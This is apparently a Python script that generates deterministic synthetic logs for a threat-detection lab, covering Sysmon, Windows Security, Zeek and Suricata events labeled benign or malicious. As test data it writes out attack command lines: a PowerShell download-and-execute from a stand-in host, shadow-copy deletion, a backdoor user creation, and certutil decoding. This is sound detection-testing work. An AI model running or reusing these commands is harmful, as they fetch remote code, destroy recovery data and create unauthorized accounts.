"""Generate deterministic, entirely synthetic sample logs for the lab (no real data).

Only RFC 5737 documentation IPs (198.51.100.0/24, 203.0.113.0/24), private 10.0.0.0/24 addresses and the
reserved '.test' TLD are used. Run:  python scripts/generate_samples.py
"""
from __future__ import annotations

import csv
import json
import random
import sys
from datetime import datetime, timedelta, timezone
from pathlib import Path

OUT = Path(__file__).resolve().parent.parent / "data" / "samples"
BASE = datetime(2024, 3, 14, 9, 0, 0, tzinfo=timezone.utc)
rnd = random.Random(1337)


def ts(minutes: float) -> datetime:
    return BASE + timedelta(minutes=minutes)


def iso(dt: datetime) -> str:
    return dt.strftime("%Y-%m-%dT%H:%M:%S.") + f"{dt.microsecond // 1000:03d}Z"


def sysmon_events() -> list[dict]:
    ev = []

    def proc(m, host, user, image, parent, cmd, label):
        ev.append({"Provider": "Microsoft-Windows-Sysmon", "EventID": 1, "UtcTime": iso(ts(m)), "Computer": host,
                   "User": f"CORP\\{user}", "Image": image, "ParentImage": parent, "CommandLine": cmd,
                   "Hashes": "SHA256=" + "%064x" % rnd.getrandbits(256), "label": label})

    def net(m, host, user, image, dip, dport, label, sip="10.0.0.21"):
        ev.append({"Provider": "Microsoft-Windows-Sysmon", "EventID": 3, "UtcTime": iso(ts(m)), "Computer": host,
                   "User": f"CORP\\{user}", "Image": image, "SourceIp": sip, "SourcePort": rnd.randint(49152, 65000),
                   "DestinationIp": dip, "DestinationPort": dport, "Protocol": "tcp", "label": label})

    def dns(m, host, user, image, name, label):
        ev.append({"Provider": "Microsoft-Windows-Sysmon", "EventID": 22, "UtcTime": iso(ts(m)), "Computer": host,
                   "User": f"CORP\\{user}", "Image": image, "QueryName": name, "label": label})

    # benign background
    ps = "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"
    for i in range(30):
        proc(i * 4, "ws-fin-01.corp.test", "alice", "C:\\Program Files\\Microsoft Office\\root\\Office16\\EXCEL.EXE",
             "C:\\Windows\\explorer.exe", "EXCEL.EXE /dde", "benign")
    for i in range(10):
        proc(2 + i * 9, "ws-hr-02.corp.test", "bob", "C:\\Windows\\System32\\svchost.exe",
             "C:\\Windows\\System32\\services.exe", "svchost.exe -k netsvcs", "benign")
    proc(15, "ws-it-03.corp.test", "carol", ps, "C:\\Windows\\explorer.exe",
         "powershell.exe -File C:\\Scripts\\inventory.ps1", "benign")
    proc(40, "ws-it-03.corp.test", "carol", "C:\\Users\\carol\\Downloads\\vendor-setup.exe", "C:\\Windows\\explorer.exe",
         "vendor-setup.exe /quiet", "benign")  # location alone: expected false positive for PROC-001
    for i in range(10):
        net(5 + i * 6, "ws-fin-01.corp.test", "alice", "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe",
            "203.0.113.200", 443, "benign")
        dns(5 + i * 6, "ws-fin-01.corp.test", "alice", "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe",
            "updates.vendor.test", "benign")
    # attack chain on ws-fin-01 (starts 10:00)
    proc(60, "ws-fin-01.corp.test", "alice", "C:\\Windows\\System32\\cmd.exe",
         "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE", "cmd.exe /c powershell -nop -w hidden", "malicious")
    enc = "JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAA="
    proc(60.5, "ws-fin-01.corp.test", "alice", ps, "C:\\Windows\\System32\\cmd.exe",
         f"powershell.exe -NoP -W Hidden -enc {enc}", "malicious")
    proc(61, "ws-fin-01.corp.test", "alice", ps, "C:\\Windows\\System32\\cmd.exe",
         "powershell.exe -c \"IEX (New-Object Net.WebClient).DownloadString('http://malicious-example.test/payload.ps1')\"",
         "malicious")
    dns(61.2, "ws-fin-01.corp.test", "alice", ps, "malicious-example.test", "malicious")
    net(61.4, "ws-fin-01.corp.test", "alice", ps, "198.51.100.23", 4444, "malicious")
    proc(63, "ws-fin-01.corp.test", "alice", "C:\\Users\\alice\\AppData\\Local\\Temp\\upd4te.exe",
         ps, "upd4te.exe", "malicious")
    proc(64, "ws-fin-01.corp.test", "alice", "C:\\Windows\\System32\\schtasks.exe", "C:\\Users\\alice\\AppData\\Local\\Temp\\upd4te.exe",
         "schtasks.exe /create /tn Updater /tr C:\\Users\\alice\\AppData\\Local\\Temp\\upd4te.exe /sc onlogon", "malicious")
    proc(66, "ws-fin-01.corp.test", "alice", "C:\\Windows\\System32\\vssadmin.exe", "C:\\Windows\\System32\\cmd.exe",
         "vssadmin.exe delete shadows /all /quiet", "malicious")
    return ev


def windows_security_rows() -> list[dict]:
    rows = []
    users = ["alice", "bob", "carol", "dave", "erin", "frank", "grace"]
    for i in range(40):  # benign logons + 2 typo failures
        u = rnd.choice(users)
        rows.append({"TimeCreated": iso(ts(i * 3)), "EventID": 4624, "Computer": "dc-01.corp.test", "TargetUserName": u,
                     "IpAddress": f"10.0.0.{rnd.randint(10, 60)}", "LogonType": 3, "label": "benign"})
    for i in range(2):
        rows.append({"TimeCreated": iso(ts(20 + i)), "EventID": 4625, "Computer": "dc-01.corp.test",
                     "TargetUserName": "bob", "IpAddress": "10.0.0.33", "LogonType": 2, "label": "benign"})
    for i in range(8):  # brute force against one account
        rows.append({"TimeCreated": iso(ts(70 + i * 0.4)), "EventID": 4625, "Computer": "dc-01.corp.test",
                     "TargetUserName": "administrator", "IpAddress": "203.0.113.50", "LogonType": 3, "label": "malicious"})
    for i, u in enumerate(["alice", "bob", "carol", "dave", "erin", "frank", "grace"]):  # password spray
        rows.append({"TimeCreated": iso(ts(80 + i * 0.5)), "EventID": 4625, "Computer": "dc-01.corp.test",
                     "TargetUserName": u, "IpAddress": "203.0.113.50", "LogonType": 3, "label": "malicious"})
    rows.append({"TimeCreated": iso(ts(90)), "EventID": 4624, "Computer": "dc-01.corp.test",
                 "TargetUserName": "administrator", "IpAddress": "203.0.113.50", "LogonType": 3, "label": "malicious"})
    rows.append({"TimeCreated": iso(ts(92)), "EventID": 4720, "Computer": "dc-01.corp.test", "SubjectUserName": "administrator",
                 "TargetUserName": "svc_backup2", "label": "malicious"})
    rows.append({"TimeCreated": iso(ts(95)), "EventID": 1102, "Computer": "dc-01.corp.test", "SubjectUserName": "administrator",
                 "label": "malicious"})
    return rows


def zeek_conn_tsv() -> str:
    head = ["#separator \\x09", "#set_separator\t,", "#empty_field\t(empty)", "#unset_field\t-", "#path\tconn",
            "#fields\tts\tuid\tid.orig_h\tid.orig_p\tid.resp_h\tid.resp_p\tproto\tconn_state", "#types\ttime\tstring\taddr\tport\taddr\tport\tenum\tstring"]
    lines, n = [], 0

    def row(m, src, dst, port, state="S1"):
        nonlocal n
        n += 1
        t = ts(m).timestamp()
        lines.append(f"{t:.6f}\tC{n:08x}\t{src}\t{rnd.randint(49152, 65000)}\t{dst}\t{port}\ttcp\t{state}")

    for i in range(20):
        row(i * 2, "10.0.0.21", "203.0.113.200", 443)
        row(i * 2, "10.0.0.31", "10.0.0.5", 53)
    for p in range(1, 25):  # port scan: 24 ports in < 60 s
        row(100 + p / 60, "10.0.0.66", "10.0.0.5", 1000 + p, "S0")
    for i, h in enumerate(["10.0.0.5", "10.0.0.6", "10.0.0.7", "10.0.0.8"]):  # lateral movement over SMB
        row(110 + i, "10.0.0.66", h, 445)
    return "\n".join(head + lines + ["#close\t2024-03-14-12-00-00"]) + "\n"


def suricata_eve() -> str:
    out = []

    def e(m, etype, src, dst, dport, **extra):
        d = {"timestamp": ts(m).strftime("%Y-%m-%dT%H:%M:%S.000000+0000"), "flow_id": rnd.randint(10**9, 10**10),
             "event_type": etype, "src_ip": src, "src_port": rnd.randint(49152, 65000), "dest_ip": dst, "dest_port": dport,
             "proto": "TCP"}
        d.update(extra)
        out.append(json.dumps(d))

    for i in range(10):
        e(i * 5, "dns", "10.0.0.21", "10.0.0.5", 53, dns={"rrname": "updates.vendor.test", "rrtype": "A"})
    e(61.4, "alert", "10.0.0.21", "198.51.100.23", 4444,
      alert={"signature": "LAB Suspicious outbound shell-style session", "signature_id": 9000001, "severity": 1})
    e(61.1, "http", "10.0.0.21", "198.51.100.23", 80, http={"hostname": "malicious-example.test", "url": "/payload.ps1"})
    return "\n".join(out) + "\n"


def labeled_eval_rows() -> list[dict]:
    """Small, independent labeled set for scoring detection quality (includes deliberate hard cases)."""
    r = []

    def add(m, cat, label, **f):
        base = {"timestamp": iso(ts(m)), "hostname": "eval-host.corp.test", "username": "tester", "event_category": cat,
                "label": label}
        base.update(f)
        r.append(base)

    ps = "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"
    for i in range(30):
        add(i, "process_creation", "benign", process_path="C:\\Windows\\System32\\notepad.exe", parent_process="explorer.exe",
            command_line="notepad.exe report.txt")
    for i in range(10):
        add(40 + i, "process_creation", "benign", process_path=ps, parent_process="explorer.exe",
            command_line="powershell.exe -File C:\\Scripts\\backup.ps1")
    add(55, "process_creation", "benign", process_path="C:\\Users\\tester\\Downloads\\installer.exe",
        parent_process="explorer.exe", command_line="installer.exe /S")  # expected FP (location only)
    for i in range(3):
        add(60 + i, "network_connection", "benign", process_name="chrome.exe", source_ip="10.0.0.9",
            destination_ip="203.0.113.200", destination_port=443)
    add(70, "process_creation", "malicious", process_path=ps, parent_process="cmd.exe",
        command_line="powershell.exe -enc JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0AA==")
    add(71, "process_creation", "malicious", process_path=ps, parent_process="cmd.exe",
        command_line="powershell.exe IEX (New-Object Net.WebClient).DownloadString('http://malicious-example.test/a.ps1')")
    add(72, "process_creation", "malicious", process_path="C:\\Windows\\System32\\vssadmin.exe", parent_process="cmd.exe",
        command_line="vssadmin delete shadows /all")
    add(73, "process_creation", "malicious", process_path="C:\\Windows\\System32\\cmd.exe", parent_process="winword.exe",
        command_line="cmd.exe /c whoami")
    add(74, "network_connection", "malicious", process_name="svc.exe", source_ip="10.0.0.9", destination_ip="198.51.100.23",
        destination_port=4444)
    add(75, "process_creation", "malicious", process_path="C:\\Windows\\System32\\net.exe", parent_process="cmd.exe",
        command_line="net user backdoor P@ssw0rd1 /add")
    add(76, "process_creation", "malicious", process_path="C:\\Windows\\System32\\cmd.exe", parent_process="cmd.exe",
        command_line="cmd.exe /c certutil -decode a.b c.exe")  # deliberate miss: no rule covers this (expected FN)
    return r


def write_csv(path: Path, rows: list[dict]) -> None:
    cols: list[str] = []
    for row in rows:
        for k in row:
            if k not in cols:
                cols.append(k)
    with path.open("w", newline="", encoding="utf-8") as fh:
        w = csv.DictWriter(fh, fieldnames=cols)
        w.writeheader()
        w.writerows(rows)


def main() -> int:
    OUT.mkdir(parents=True, exist_ok=True)
    (OUT / "sysmon_sample.json").write_text(json.dumps(sysmon_events(), indent=1), encoding="utf-8")
    write_csv(OUT / "windows_security_sample.csv", windows_security_rows())
    (OUT / "zeek_conn_sample.log").write_text(zeek_conn_tsv(), encoding="utf-8")
    (OUT / "suricata_eve_sample.json").write_text(suricata_eve(), encoding="utf-8")
    write_csv(OUT / "labeled_eval.csv", labeled_eval_rows())
    print("Sample files written to", OUT)
    return 0


if __name__ == "__main__":
    sys.exit(main())
